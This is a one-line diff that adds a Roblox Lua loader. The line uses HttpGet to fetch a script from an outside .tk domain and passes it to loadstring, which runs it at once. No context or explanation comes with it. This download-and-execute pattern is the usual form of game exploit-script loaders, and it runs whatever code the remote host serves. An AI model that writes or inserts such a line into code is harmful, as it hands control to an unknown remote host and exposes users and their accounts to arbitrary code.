@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://notminhducgamingtv.tk/script/get"))()
